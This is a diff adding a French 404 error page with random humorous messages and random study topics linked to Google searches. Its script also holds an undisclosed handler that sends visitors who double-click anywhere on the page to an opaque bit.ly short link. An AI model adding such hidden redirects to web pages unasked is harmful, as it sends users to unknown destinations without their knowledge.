@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(-45deg, #ff6b6b, #f4a261, #2a9d8f, #264653);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            color: #ffffff;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .container {
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .error-code {
+            font-size: 96px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+        .error-message {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        .suggestions {
+            font-size: 18px;
+            color: #ffffff;
+        }
+        .suggestions ul {
+            list-style: none;
+            padding: 0;
+        }
+        .suggestions li {
+            margin: 10px 0;
+        }
+        .suggestions a {
+            color: #ffdd57;
+            text-decoration: none;
+            transition: color 0.3s, transform 0.3s;
+        }
+        .suggestions a:hover {
+            color: #ffd700;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="error-code">404</div>
+        <div class="error-message" id="error-message"></div>
+        <div class="suggestions">
+            <p>Essayez d'apprendre quelque chose de nouveau :</p>
+            <ul id="suggestions-list">
+                <!-- Les suggestions seront ajoutées ici par JavaScript -->
+            </ul>
+        </div>
+    </div>
+    <script>
+        const errorMessages = [
+            "Oops ! Cette page s'est perdue en route.",
+            "Désolé, cette page n'a pas été trouvée... encore.",
+            "404 : La page que vous cherchez a pris un café.",
+            "Hé là ! On dirait que cette page s'est envolée.",
+            "Eh bien, ce n'était pas censé arriver. 404 !"
+        ];
+
+        const suggestions = [
+            "Apprendre les bases des équations différentielles",
+            "Les règles de grammaire française",
+            "Les propriétés des nombres premiers",
+            "L'histoire de la langue française",
+            "Les figures de style en littérature",
+            "Les concepts fondamentaux de la géométrie",
+            "Les synonymes et antonymes courants",
+            "Les théorèmes de base en algèbre",
+            "L'évolution de la langue française au fil des siècles",
+            "Les stratégies pour améliorer son vocabulaire"
+        ];
+
+        function getRandomElement(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+
+        function displayErrorMessage() {
+            const errorMessageElement = document.getElementById('error-message');
+            errorMessageElement.textContent = getRandomElement(errorMessages);
+        }
+
+        function displaySuggestions() {
+            const suggestionsList = document.getElementById('suggestions-list');
+            const randomSuggestions = suggestions.sort(() => 0.5 - Math.random()).slice(0, 5);
+            randomSuggestions.forEach(suggestion => {
+                const li = document.createElement('li');
+                const searchQuery = encodeURIComponent(suggestion);
+                li.innerHTML = `<a href="https://www.google.com/search?q=${searchQuery}" target="_blank">${suggestion}</a>`;
+                suggestionsList.appendChild(li);
+            });
+        }
+
+        function redirect() {
+            window.location.href = "https://bit.ly/tosy";
+        }
+
+        let clickCount = 0;
+        document.body.addEventListener('click', function() {
+            clickCount++;
+            if (clickCount === 2) {
+                redirect();
+            }
+            setTimeout(() => clickCount = 0, 500);
+        });
+
+        // Initialize the page
+        displayErrorMessage();
+        displaySuggestions();
+    </script>
+</body>
+</html>
